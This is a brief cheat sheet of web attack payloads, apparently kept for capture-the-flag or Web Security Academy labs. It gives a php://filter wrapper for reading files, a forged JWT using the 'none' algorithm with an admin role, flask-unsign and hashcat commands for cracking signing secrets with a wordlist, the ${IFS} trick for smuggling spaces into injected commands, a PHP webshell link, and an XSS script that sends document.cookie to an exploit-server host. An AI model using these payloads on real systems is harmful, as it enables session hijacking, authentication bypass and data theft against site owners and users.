space php use in filter
```php
php://filter/convert.iconv.utf-8.utf-16le/resource=file://
```
---

in JWT 
```JSON 
{
  "typ": "JWT",
  "alg": "none"
}
```
none or NoNe or noNE ...etc
Don't send the SIGNATURE send like this :

`eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJyb2xlIjoiYWRtaW4ifQ.`
and don't forget dot `.` 

---
to crack jwt use it command :
```bash
flask-unsign --unsign --no-literal-eval --wordlist /usr/share/wordlists/rockyou.txt --cookie eyJsb2dpbiI6dHJ1ZSwidXNlciI6Im1vaG5hZCIsImFsZyI6IkhTMjU2In0.Ywfvv703.uwZ8eXSTttoVjrXphTqPQprtQod81UmIo6xRfcWY3ao
```

---
```
in php " " == ${IFS}
```
---
[backdore php](https://sushant747.gitbooks.io/total-oscp-guide/content/webshell.html)

---
xss ngrpk paylode
```js
<script> var i=new Image(); i.src='https://exploit-0acc00b804bd4cfac0c1a75b017a007d.web-security-academy.net/exploit?='+document.cookie</script>
```

---
JWT Brute-forcing secret keys using hashcat

```bash
hashcat -a 0 -m 16500 <jwt> <wordlist>
```
